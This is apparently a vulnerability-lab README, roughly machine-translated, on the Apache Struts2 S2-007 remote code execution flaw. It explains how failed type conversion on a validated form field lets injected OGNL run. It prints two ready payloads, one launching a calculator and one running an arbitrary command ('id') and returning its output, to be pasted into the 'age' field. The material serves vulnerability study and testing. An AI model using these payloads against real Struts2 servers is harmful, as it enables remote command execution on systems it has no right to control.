# S2-007 Remote Code Execution Vulnerability

Impact version: 2.0.0 - 2.2.3
Vulnerability details: http://struts.apache.org/docs/s2-007.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Principle

Reference http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html

When the validation rule `<ActionName>-validation.xml` is configured, if the type validation conversion fails, the backend will by default splicing the user-submitted form values ​​through strings, then performing an OGNL expression parsing and returning. For example here is a UserAction:

```java
(...)
Public class UserAction extends ActionSupport {
Private Integer age;
Private String name;
Private String email;

(...)
```

Then configure UserAction-validation.xml:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
"-//OpenSymphony Group//XWork Validator 1.0//EN"
"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
<field name="age">
<field-validator type="int">
<param name="min">1</param>
<param name="max">150</param>
</field-validator>
</field>
</validators>
```

When the user submits age as a string instead of an integer value, the backend splices `"'" + value + "'"` with the code and then parses the OGNL expression. To make a successful use, you only need to find a form field configured with similar validation rules to make a conversion error. You can inject any OGNL expression by means of SQLi-injected single quotes.

Because the affected version is Struts2 2.0.0 - Struts2 2.2.3, here is the Payload that bypasses the security configuration for command execution (**Magnetic Calculator, cannot run in this project environment**):

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@ getRuntime().exec("open /Applications/Calculator.app")) + '
```

## Exploit

@rickgray In the original text only gave the POC of the bomb calculator, I gave the EXP to execute arbitrary code:

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons. io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

Pass Exp into the input box (age) that can be used to get the command execution result:

![](1.jpeg)